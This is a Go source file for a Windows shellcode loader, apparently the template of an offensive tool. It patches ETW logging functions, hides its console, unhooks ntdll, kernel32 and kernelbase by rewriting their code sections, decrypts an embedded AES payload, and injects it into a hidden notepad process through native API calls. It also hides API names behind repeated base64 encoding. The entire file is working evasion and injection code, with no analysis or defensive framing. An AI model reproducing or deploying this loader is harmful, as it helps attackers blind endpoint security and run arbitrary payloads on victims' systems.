package main

import "C"

import (
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"injection/injection"

	"io/ioutil"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	PROCESS_ALL_ACCESS= 0x1F0FFF
)
var _ unsafe.Pointer
const (
	errnoERROR_IO_PENDING= 997
)
var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
	customsyscall uint16
	b64number int = 5
)

func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	return e
}



var funcNtCreateThreadEx = syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateThreadEx")
var funcNtWriteVirtualMemory = syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteVirtualMemory")
var funcNtAllocateVirtualMemory = syscall.NewLazyDLL("ntdll.dll").NewProc("NtAllocateVirtualMemory")
var funcNtProtectVirtualMemory = syscall.NewLazyDLL("ntdll.dll").NewProc("NtProtectVirtualMemory")

var procEnumProcessModules = syscall.NewLazyDLL("psapi.dll").NewProc("EnumProcessModules")
var procGetModuleBaseName = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleBaseNameW")
var procGetModuleInformation = syscall.NewLazyDLL("psapi.dll").NewProc("GetModuleInformation")


func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

func (e *SyscallError) Error() string {
	return fmt.Sprintf("%s: %v", e.call, e.err)
}

const (
	MEM_FREE    = 0x100 << 8
	MEM_COMMIT  = 0x10 << 8
	MEM_RESERVE = 0x20 << 8
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

type MemoryBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

type MODULEINFO struct {
	LpBaseOfDll uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

func CreateProcess() *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	target := "C:\\Windows\\System32\\notepad.exe"
	cmdline, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}
	var startupInfo StartupInfoEx
	si.Cb = uint32(unsafe.Sizeof(startupInfo))
	si.Flags |= windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE

	err = syscall.CreateProcess(
		nil,
		cmdline,
		nil,
		nil,
		false,
		0,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

func GetModuleInformation(hProcess windows.Handle, hModule windows.Handle) (MODULEINFO, error) {
	mi := MODULEINFO{}
	_, _, err := procGetModuleInformation.Call(
		uintptr(hProcess),
		uintptr(hModule),
		uintptr(unsafe.Pointer(&mi)),
		uintptr(uint32(unsafe.Sizeof(mi))))
	if err.(syscall.Errno) != 0 {
		return mi, err
	}
	return mi, nil
}

func GetModuleBaseName(process windows.Handle, module windows.Handle, outString *uint16, size uint32) (n int, err error) {
	r1, _, e1 := procGetModuleBaseName.Call(
		uintptr(process),
		uintptr(module),
		uintptr(unsafe.Pointer(outString)),
		uintptr(size),
	)
	if r1 == 0 {
		return 0, errno(e1)
	}
	return int(r1), nil
}

func EnumProcessModules(process windows.Handle, modules []windows.Handle) (n int, err error) {
	var needed int32
	const handleSize = unsafe.Sizeof(modules[0])
	r1, _, e1 := procEnumProcessModules.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(&modules[0])),
		handleSize*uintptr(len(modules)),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r1 == 0 {
		err = errno(e1)
		return 0, err
	}
	n = int(uintptr(needed) / handleSize)
	return n, nil
}


func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding  := int(src[length-1])
	return src[:(length - unpadding )]
}


func Hide(show bool) {
	//GetConsoleWindowName
	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc(cusBase64decode("VWpKV01GRXlPWFZqTWpseldsWmtjR0p0VW5aa2R6MDk="))
	//ShowWindowName
	showWin := syscall.NewLazyDLL("user32.dll").NewProc(cusBase64decode("VlRKb2RtUXhaSEJpYlZKMlpIYzlQUT09"))
	hwnd, _, _ := getWin.Call()
	if hwnd == 0 {
		return
	}
	if show {
		var SW_RESTORE uintptr = 9
		showWin.Call(hwnd, SW_RESTORE)
	} else {
		var SW_HIDE uintptr = 0
		showWin.Call(hwnd, SW_HIDE)
	}
}

func Versionfunc() string {
	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	CurrentVersion, _, _ :=  regkey.GetStringValue("CurrentVersion")
	MajorVersion, _, err := regkey.GetIntegerValue("CurrentMajorVersionNumber")
	if err == nil{
		MinorVersion, _, _ := regkey.GetIntegerValue("CurrentMinorVersionNumber")
		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
	}
	defer regkey.Close()

	if CurrentVersion == "10.0" {
		customsyscall = 0x50
	} else if CurrentVersion == "6.3" {
		customsyscall = 0x4f
	} else if CurrentVersion == "6.2" {
		customsyscall = 0x4e
	} else if CurrentVersion == "6.1" {
		customsyscall= 0x4d
	}
	return CurrentVersion
}



func cusBase64decode(b64 string,) string {
	var decoded []byte
	decoded, _ = base64.StdEncoding.DecodeString(b64)
	sum := 1
	for i := 1; i < b64number; i++ {
		decoded, _ = base64.StdEncoding.DecodeString(string(decoded))
		sum += i
	}
	return string(decoded)
}

//WriteProcessMemoryName
var procWriteProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc(cusBase64decode("VmpOS2NHUkhWbEZqYlRscVdsaE9lbFJYVm5SaU0wbzE="))
//EtwNotificationRegisterName
var procEtwNotificationRegister = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xUnRPVEJoVjFwd1dUSkdNR0ZYT1hWVmJWWnVZVmhPTUZwWVNUMD0="))
//EtwEventRegisterName
var procEtwEventRegister = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKVFdsZGtjR016VW14alp6MDk="))
//EtwEventWriteFullName
var procEtwEventWriteFull = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBWV2pGaVIzYzk="))
//EtwEventWriteName
var procEtwEventWrite = syscall.NewLazyDLL("ntdll.dll").NewProc(cusBase64decode("VWxoU00xSllXbXhpYmxKWVkyMXNNRnBSUFQwPQ=="))

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesWritten *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}



func patchETW() {
	handle := uintptr(0xffffffffffffffff)
	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWriteFull.Addr()}
	for i, _ := range dataAddr {
		data, _ := hex.DecodeString("4833C0C3")
		var nLength uintptr
		datalength := len(data)
		WriteProcessMemory(handle, dataAddr[i], uintptr(unsafe.Pointer(&data[0])), uintptr(uint32(datalength)), &nLength)
	}
}



func FullUnhook()  {
	//C:\\windows\\system32\\kernel32.dll
	err := Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0Y2xwWVNuVmFWM2Q2VFdrMWEySkhkejA9"))
	if err != nil {

	}
	//C:\\windows\\system32\\kernelbase.dll
	err = Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0Y2xwWVNuVmFWM2hwV1ZoT2JFeHRVbk5pUVQwOQ=="))
	if err != nil {

	}
	//C:\\windows\\system32\\ntdll.dll
	err = Reloading(cusBase64decode("VVhwd1kxWXliSFZhUnprell6RjRWR1ZZVGpCYVZ6QjZUV3g0ZFdSSFVuTmlRelZyWWtkM1BRPT0="))
	if err != nil {

	}
}

func ReloadRemoteProcess(raw_bin []byte) {
	pi := CreateProcess()

	time.Sleep(5 * time.Second)
	hh, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pi.ProcessId)
	if err != nil {
	}
	modules := make([]windows.Handle, 255)
	n, err := EnumProcessModules(hh, modules)
	if err != nil {
		fmt.Println(&SyscallError{"EnumProcessModules", err})
	}
	if n < len(modules) {
		modules = modules[:n]
	}

	var buf = make([]uint16, 255)
	for _, mod := range modules {
		MI, _ := GetModuleInformation(hh, mod)
		n, err = GetModuleBaseName(hh, mod, &buf[0], uint32(len(buf)))
		if err != nil {
		}
		s := windows.UTF16ToString(buf[:n])
		if s == "ntdll.dll" {
			RemoteModuleReloading("C:\\Windows\\System32\\ntdll.dll", MI.LpBaseOfDll, hh)
		}
		if s == "KERNEL32.DLL" {
			RemoteModuleReloading("C:\\Windows\\System32\\kernel32.dll", MI.LpBaseOfDll, hh)
		}
		if s == "KERNELBASE.dll" {
			RemoteModuleReloading("C:\\Windows\\System32\\kernelbase.dll", MI.LpBaseOfDll, hh)
		}
	}

	shellcode  := raw_bin
	oldProtect := windows.PAGE_READWRITE
	var lpBaseAddress uintptr
	size := len(shellcode)

	funcNtAllocateVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), 0, uintptr(unsafe.Pointer(&size)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	funcNtWriteVirtualMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), 0)
	funcNtProtectVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), uintptr(unsafe.Pointer(&size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	funcNtCreateThreadEx.Call(uintptr(unsafe.Pointer(&pi.Thread)), windows.GENERIC_EXECUTE, 0, uintptr(pi.Process), lpBaseAddress, lpBaseAddress, 0, 0, 0, 0, 0)
	syscall.CloseHandle(pi.Thread)
}

func main() {
	patchETW()
	Hide(false)
	Version := Versionfunc()
	if Version == "10.0" {
		FullUnhook()
	}
	patchETW()

	var ciphertext string
		ciphertext = ciphertext + "Base64String1"
		ciphertext = ciphertext + "Base64String2"
		ciphertext = ciphertext + "Base64String3"
		ciphertext = ciphertext + "Base64String4"
		ciphertext = ciphertext + "Base64String5"
		ciphertext = ciphertext + "Base64String6"
		ciphertext = ciphertext + "Base64String7"
		ciphertext = ciphertext + "Base64String8"

	vciphertext, _ := base64.StdEncoding.DecodeString(ciphertext)
	vkey, _ := base64.StdEncoding.DecodeString("YGCjSIR7GeeCHP6f0oojty+LQHhq9Q/T+kFsYu5cQis=")
	viv, _ := base64.StdEncoding.DecodeString("zwkzBfI91tEoMK89i9witA==")

	block, err := aes.NewCipher(vkey)
	if err != nil {
		return
	}

	if len(vciphertext) < aes.BlockSize {
		return
	}

	decrypted := make([]byte, len(vciphertext))
	mode := cipher.NewCBCDecrypter(block, viv)
	mode.CryptBlocks(decrypted, vciphertext)
	stuff := PKCS5UnPadding(decrypted)

	rawdata := (string(stuff))
	hexdata, _ := base64.StdEncoding.DecodeString(rawdata)
	raw_bin, _ := hex.DecodeString(string(hexdata))
	ReloadRemoteProcess(raw_bin)
}


func RemoteModuleReloading(name string, addr uintptr, ZbYTQACc windows.Handle) error {
	dll, error := ioutil.ReadFile(name)
	if error != nil {
		return error
	}
	file, error := pe.Open(name)
	if error != nil {
		return error
	}
	x := file.Section(".text")
	bytes := dll[x.Offset:x.Size]
	dllBase := addr
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	rawbytes := fmt.Sprintf("%X", bytes)
	data, _ := hex.DecodeString(string(rawbytes))
	regionsize := len(bytes)
	offsetaddr := uintptr(dllOffset)
	var nLength uintptr
	WriteProcessMemory(uintptr(ZbYTQACc), offsetaddr, uintptr(unsafe.Pointer(&data[0])), uintptr(uint32(regionsize)), &nLength)

	return nil
}



func Reloading(DLLname string) error {
	dll, err := ioutil.ReadFile(DLLname)
	if err != nil {
		return err
	}
	file, error1 := pe.Open(DLLname)
	if error1 != nil {
		return error1
	}
	x := file.Section(".text")
	bytes := dll[x.Offset:x.Size]
	loaddll, error2 := windows.LoadDLL(DLLname)
	if error2 != nil {
		return error2
	}
	handle := loaddll.Handle
	dllBase := uintptr(handle)
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	var oldfartcodeperms uintptr
	regionsize := uintptr(len(bytes))
	handlez := uintptr(0xffffffffffffffff)
	runfunc, _ := NtProtectVirtualMemory(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		syscall.PAGE_EXECUTE_READWRITE,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}


	for i := 0; i < len(bytes); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = bytes[i]
	}

	runfunc, _ = NtProtectVirtualMemory(
		customsyscall,
		handlez,
		(*uintptr)(unsafe.Pointer(&dllOffset)),
		&regionsize,
		oldfartcodeperms,
		&oldfartcodeperms,
	)
	if runfunc != 0 {
	}

	return nil
}


func NtProtectVirtualMemory(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {
	return injection.NtProtectVirtualMemory(
		sysid,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		NewProtect,
		uintptr(unsafe.Pointer(oldprotect)),
	)
}


	
	